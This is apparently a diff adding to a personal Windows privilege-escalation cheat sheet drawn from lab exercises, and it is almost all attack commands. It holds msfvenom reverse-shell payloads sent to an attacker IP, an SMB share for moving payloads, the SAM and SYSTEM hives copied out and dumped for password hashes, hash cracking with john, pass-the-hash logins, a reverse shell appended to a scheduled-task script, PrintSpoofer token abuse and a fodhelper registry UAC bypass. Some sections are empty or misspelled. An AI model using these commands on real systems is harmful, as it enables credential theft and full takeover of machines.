@@ -65,6 +65,33 @@ reverse.exe
 
 # 2. MANUAL ENUMERATION 
 
+
+USERS
+whoami
+whoami /all
+net users 
+net users test
+
+
+HOSTNAME
+hostname
+
+
+OS VERSION AND ARCHITECTURE
+systeminfo
+systeminfo I findstr /B / C: “OS Name" /C: “OS Version" /C:"System Type"
+
+Findstr - search for a specific text string in computer files
+/B - match patterns at the beginning of a line
+/C - specify a particular search string
+
+
+RUNNING PROCESS & SERVICES
+tasklist - #list the running processes on Windows
+tasklist /SVC - #return processes that are mapped to a specific Windows service
+
+
+
 ## USERS
 ```
 
@@ -231,8 +258,148 @@ C:\PrivEsc\winPEASany.exe filesinfo
 winexe -U 'admin%password123' //10.10.6.138 cmd.exe
 ```
 
+## CATEGORY "PASSWORDS" - SAVED CREDENTIALS
+```
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
+
+cmdkey /list
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
+
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+```
+
+## CATEGORY "PASSWORDS" - SECURITY ACCOUNT MANAGER
+```
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
+
+copy C:\Windows\Repair\SYSTEM \\10.18.5.137\kali\
+copy C:\Windows\Repair\SAM \\10.18.5.137\kali\
+
+sudo git clone https://github.com/Tib3rius/creddump7
+sudo pip3 install pycrypto
+sudo python3 creddump7/pwdump.py SYSTEM SAM
+
+locate secretsdump.py 
+python3 /opt/impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
+python3 /usr/lib/python3/dist-packages/impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
+user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
+admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
+
+sudo echo "admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::" > hash.txt
 
 
+john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+pth-winexe -U 'admin%password123' //10.10.93.233 cmd.exe
+xfreerdp /u:admin /p:password123 /cert:ignore /v:10.10.93.233
+```
+
+## CATEGORY "PASSWORDS" - PASSTHEHASH
+```
+pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.222.90 cmd.exe
+```
+
+
+
+
+________________________________________________
+CATEGORY : SCHEDULED TASKS
+________________________________________________
+
+type C:\DevTools\CleanUp.ps1
+C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+nc -lvp 123
+
+
+________________________________________________
+CATEGORY : INSECURE GUI APPS
+________________________________________________
+
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
+rdesktop -u user -p password321 10.10.88.2
+tasklist /V | findstr mspaint.exe
+file://C:/windows/system32/cmd.exe
+
+
+________________________________________________
+CATEGORY : STARTUP APPS
+________________________________________________
+
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
+C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+cscript C:\PrivEsc\CreateShortcut.vbs
+rdesktop -u admin 10.10.88.2
+
+
+
+________________________________________________
+CATEGORY TOKEN IMPERSONATION: - ROUGE POTATO 
+________________________________________________
+
+
+
+________________________________________________
+CATEGORY OKEN IMPERSONATION: PRINTSPOOLER
+________________________________________________
+
+
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
+PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
+
+
+
+________________________________________________
+PRIVILEGE ESCALATION SCRIPTS
+________________________________________________
+
+
+
+________________________________________________
+UAC BYPASS
+________________________________________________
+
+whoami /groups
+powershell.exe Start-Process cmd.exe -Verb runAs
+Sighcheck.exe -a -m C:\Windows\System32\fodhelper.exe
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d “cmd.exe” /f
+
+
+runas /user:USER­NAME “C:\full\path\of\Program.exe”
+
+runas /user:Adminsitrator “C:\Windows\system32\notepad.exe”
+runas /user:Adminsitrator “C:\Windows\system32\cmd.exe”
+runas /user:rgeller “C:\temp\mimikatz.exe”
+
+
+
+
+runas /user:rgeller /WAIT /B "c:/windows/system32/cmd.exe"
 
 
 
